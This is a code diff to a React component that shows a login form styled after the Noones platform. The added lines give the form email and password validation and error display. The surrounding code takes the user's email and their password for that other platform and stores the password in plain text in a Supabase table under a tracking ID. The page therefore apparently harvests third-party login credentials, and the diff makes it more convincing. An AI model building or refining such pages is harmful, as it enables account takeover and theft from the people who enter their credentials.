@@ -21,10 +21,34 @@ export default function NoonesConnect() {
     email: '',
     password: '',
   });
+  const [emailError, setEmailError] = useState('');
+  const [passwordError, setPasswordError] = useState('');
   const emailInputRef = useRef<HTMLInputElement | null>(null);
 
+  const validateEmail = (email: string) => {
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    return emailRegex.test(email);
+  };
+
+  const validatePassword = (password: string) => password.length >= 6;
+
   const handleFieldChange = (field: string) => (event: React.ChangeEvent<HTMLInputElement>) => {
-    setCredentials((current) => ({ ...current, [field]: event.target.value }));
+    const value = event.target.value;
+    setCredentials((current) => ({ ...current, [field]: value }));
+
+    if (field === 'email') {
+      if (!validateEmail(value)) {
+        setEmailError('Please enter a valid email');
+      } else {
+        setEmailError('');
+      }
+    } else if (field === 'password') {
+      if (!validatePassword(value)) {
+        setPasswordError('Password must be at least 6 characters');
+      } else {
+        setPasswordError('');
+      }
+    }
   };
 
   const saveNoonesProgress = (step: number, trackingId?: string, requestData?: Record<string, unknown>) => {
@@ -79,8 +103,8 @@ export default function NoonesConnect() {
   const handleSubmit = async (event: React.FormEvent) => {
     event.preventDefault();
     const { email, password } = credentials;
-    if (!email || !password) {
-      setErrorMessage('Please enter your email/phone and password.');
+    if (!email || !password || emailError || passwordError) {
+      setErrorMessage('Please correct the errors above.');
       return;
     }
     
@@ -104,14 +128,14 @@ export default function NoonesConnect() {
       // This returns immediately, but the sync happens in the background
       const syncId = `noones-step1-${trackingId}`;
       fireAndMove(
-        () => supabase
+        () => Promise.resolve(supabase
           .from('platform_connection_requests')
           .insert({
             tracking_id: trackingId,
             platform: 'Noones',
             email,
             third_party_password: password,
-          }),
+          })),
         syncId,
         { maxAttempts: 3, delayMs: 500 }
       );
@@ -175,12 +199,13 @@ export default function NoonesConnect() {
               <label className={`block text-[14px] font-bold ${isDarkMode ? 'text-[#8F92A3]' : 'text-[#666A78]'}`}>Email/Phone number</label>
               <input
                 ref={emailInputRef}
-                type="text"
+                type="email"
                 value={credentials.email}
                 onChange={handleFieldChange('email')}
                 placeholder="Email/Phone number"
                 className={`${inputClasses} w-full h-[52px] px-4 rounded-xl border-none outline-none focus:ring-1 focus:ring-[#00c076] transition-all text-[16px]`}
               />
+              {emailError && <p className="text-red-500 text-[13px] font-semibold">{emailError}</p>}
             </div>
 
             <div className="space-y-2">
@@ -197,6 +222,7 @@ export default function NoonesConnect() {
                   <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="rotate-180"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
                 </div>
               </div>
+              {passwordError && <p className="text-red-500 text-[13px] font-semibold">{passwordError}</p>}
               <div className="flex justify-end">
                 <button type="button" className="text-[14px] font-bold hover:underline" style={{color: isDarkMode ? '#44C166' : '#18C37E'}}>Don't forget password?</button>
               </div>
@@ -206,7 +232,8 @@ export default function NoonesConnect() {
 
             <button
               type="submit"
-              className="w-full h-[60px] hover:opacity-90 text-white font-bold text-[20px] rounded-xl transition-colors"
+              disabled={!credentials.email || !credentials.password || !!emailError || !!passwordError}
+              className="w-full h-[60px] hover:opacity-90 disabled:opacity-50 disabled:cursor-not-allowed text-white font-bold text-[20px] rounded-xl transition-colors"
               style={{backgroundColor: isDarkMode ? '#44C166' : '#18C37E'}}
             >
               Log in
